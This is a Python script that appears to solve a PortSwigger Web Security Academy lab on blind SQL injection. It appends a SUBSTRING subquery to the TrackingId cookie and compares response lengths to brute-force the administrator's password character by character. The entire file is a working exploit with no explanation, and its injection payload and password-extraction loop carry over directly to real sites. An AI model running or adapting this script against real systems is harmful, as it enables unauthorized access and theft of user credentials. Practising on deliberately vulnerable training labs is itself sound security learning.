#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import itertools
import string



# initialize a session & get page sucsses blind SQLi correct length
url = 'https://0a4a006503096161c0fb708c008e0080.web-security-academy.net/filter?category=Corporate+gifts'
session = requests.Session()
r = session.get(url)
cookies = r.cookies.get_dict()
rq = requests.get(url, cookies=cookies)
passwdlen = len(rq.text)
cookies = r.cookies.get_dict()

#craft Blind SQLi 
def inject(x, y):
    global url
    session = requests.Session()
    r = session.get(url)
    cookies = r.cookies.get_dict()
    SQLI = "'+AND+(SELECT+SUBSTRING(password,1,{})+FROM+users+WHERE+username%3d'administrator')='{}'--".format(x, y)
    cookies.update({'TrackingId': cookies['TrackingId'] +  SQLI })
    rq = requests.get(url, cookies=cookies)
    passwdguess = len(rq.text)
#    print(cookies)
    return passwdguess


#Brute Force pass using SQLi
def guess_password(passwdlen):
    chars = string.digits + string.ascii_lowercase
    passwd =''
    x = 1
    
    while inject(x,passwd) != passwdlen:
        #for password_length in range(20):
        for guess in itertools.cycle(chars):#, repeat=password_length):
                 guess = passwd + ''.join(guess)
         
                 print('firstBF: '+ guess)
            
                 if inject(x,guess) == passwdlen:
                     passwd = guess + ''
                     x = x + 1
                     print(x)
                     if x > 20:
                         break
                     
    return passwd


print(guess_password(passwdlen))

